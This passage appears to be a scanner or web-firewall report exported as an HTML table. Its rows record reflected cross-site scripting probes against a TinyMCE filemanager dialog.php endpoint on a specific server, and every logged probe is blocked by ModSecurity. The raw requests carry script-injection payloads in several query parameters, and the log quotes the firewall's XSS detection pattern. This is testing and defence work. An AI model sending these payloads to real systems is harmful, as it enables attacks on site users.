&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e01</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id='&gt;&lt;script&gt;alert(595599)&lt;/script&gt;&lt;!--&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719761e01=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=l10d0687ro8pqmqscjhegkaql4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:37</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:36 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(595599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqHKwQAW0AABu6pK8AAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqHKwQAW0AABu6pK8AAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358348</td><td class=xl24 width=64 >2015-03-31 00:19:11</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup='&gt;&lt;script&gt;alert(782399)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=0j2q12vi8pbbhmvop4r8v0h0s1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:38</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:37 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(782399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqHawQAW0AABrOWa8AAAAJ&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqHawQAW0AABrOWa8AAAAJ</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358349</td><td class=xl24 width=64 >2015-03-31 00:20:30</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e01</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_0</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=&quot;&gt;&lt;script&gt;alert(325199)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=test/&amp;5519719761e01=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=8pg4ldqtdome4b3gjkpoo7kl04
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:39</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:38 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_0. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(325199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqHqwQAW0AAD9hYFwAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqHqwQAW0AAD9hYFwAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358350</td><td class=xl24 width=64 >2015-03-31 00:22:14</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(336099)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=ugv8vi32bmu216a3ehl0iln7d5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:41</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:40 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(336099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqIKwQAW0AABvT9@0AAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqIKwQAW0AABvT9@0AAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358351</td><td class=xl24 width=64 >2015-03-31 00:22:39</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e63</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&lt;script&gt;prompt(990099)&lt;/script/&gt;&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719761e63=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=ik17779sm48b2gnf9jesrf5237
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:42</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:41 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(990099)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqIawQAW0AABqr3CQAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqIawQAW0AABqr3CQAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358352</td><td class=xl24 width=64 >2015-03-31 00:23:59</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e01</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=&quot;&gt;&lt;script&gt;alert(317699)&lt;/script&gt;&lt;!--&amp;fldr=test/&amp;5519719761e01=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=2d5gohs6s7mk137tj0hbmdquq7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:43</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:42 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(317699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqIqwQAW0AABrkSYsAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqIqwQAW0AABrkSYsAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358353</td><td class=xl24 width=64 >2015-03-31 00:24:23</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain='&gt;&lt;script&gt;alert(983799)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=45rrde4b82c2grnu6ev62e2fm1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:45</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:43 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(983799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqI6wQAW0AABtTHQwAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqI6wQAW0AABtTHQwAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358354</td><td class=xl24 width=64 >2015-03-31 00:26:11</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e63</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(536099)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;5519719761e63=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=kkdu0ri4cjb68rkmn741god2k6
Connection: Close

